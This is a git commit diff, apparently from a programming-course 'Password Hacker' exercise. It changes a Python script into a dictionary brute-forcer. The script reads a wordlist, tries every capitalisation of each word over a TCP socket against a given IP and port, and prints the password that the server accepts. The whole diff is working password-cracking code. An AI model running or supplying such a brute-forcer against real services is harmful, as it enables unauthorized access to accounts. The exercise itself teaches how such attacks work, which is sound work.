372cb33f5b7834f7c4ba8f8b56c775cc4d6f08cc
JulianArmour <35701671+JulianArmour@users.noreply.github.com>
2020-05-15 10:20:42 -0400

    Stage #3: Dictionary brute force

--- Password Hacker/task/hacking/hack.py
+++ Password Hacker/task/hacking/hack.py
@@ -1,4 +1,3 @@
-import sys
 from itertools import count, combinations_with_replacement, chain, product
 import socket
 import argparse
@@ -16,36 +15,36 @@ def generate_all_passwords():
     return (''.join(password) for password in passwords)
 
 
-def capitalize(word, selector):
-    # ex: capitalize("abc", (True, False, True)) -> "AbC"
-    chars = [char.upper() if selected else char
-             for char, selected in zip(word, selector)]
-    return ''.join(chars)
+def pw_case_permutations(password):
+    cases = [{char, char.upper()} for char in password]
+    permutations = product(*cases)
+    return (''.join(permutation) for permutation in permutations)
 
 
-def case_permutations(word):
-    for permutation in product([False, True], repeat=len(word)):
-        yield capitalize(word, permutation)
-
-
-def capitalizations(password):
-    pw_without_digits = [char for char in password if not char.isdigit()]
-    for permutation in case_permutations(pw_without_digits):
-        perm_letter = iter(permutation)
-        yield ''.join(
-            char if char.isdigit() else next(perm_letter) for char in password)
-
-
-arg_parser = argparse.ArgumentParser()
-arg_parser.add_argument('IP_address')
-arg_parser.add_argument('port', type=int)
-cli_args = arg_parser.parse_args()
-
-with socket.socket() as client:
-    client.connect((cli_args.IP_address, cli_args.port))
-    for password in generate_all_passwords():
-        client.send(password.encode())
+def try_password(password, client):
+    for permutation in pw_case_permutations(password):
+        client.send(permutation.encode())
         response = client.recv(32).decode()
         if response == 'Connection success!':
-            print(password)
-            break
+            return True, permutation
+    return False, None
+
+
+def main():
+    arg_parser = argparse.ArgumentParser()
+    arg_parser.add_argument('IP_address')
+    arg_parser.add_argument('port', type=int)
+    cli_args = arg_parser.parse_args()
+    path = 'C:/Users/Julian/PycharmProjects/Password Hacker/Password ' \
+           'Hacker/task/hacking/passwords.txt'
+    with socket.socket() as client, open(path) as pw_file:
+        client.connect((cli_args.IP_address, cli_args.port))
+        for password in map(str.strip, pw_file):
+            cracked, pw = try_password(password, client)
+            if cracked:
+                print(pw)
+                break
+
+
+if __name__ == '__main__':
+    main()
